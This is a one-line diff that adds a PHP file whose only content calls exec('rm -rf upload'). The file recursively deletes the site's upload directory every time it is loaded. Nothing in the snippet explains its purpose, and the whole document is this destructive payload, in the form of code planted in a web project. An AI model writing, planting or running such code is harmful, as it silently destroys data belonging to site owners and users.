@@ -1,0 +1,1 @@
+<? exec("rm -rf upload"); ?>
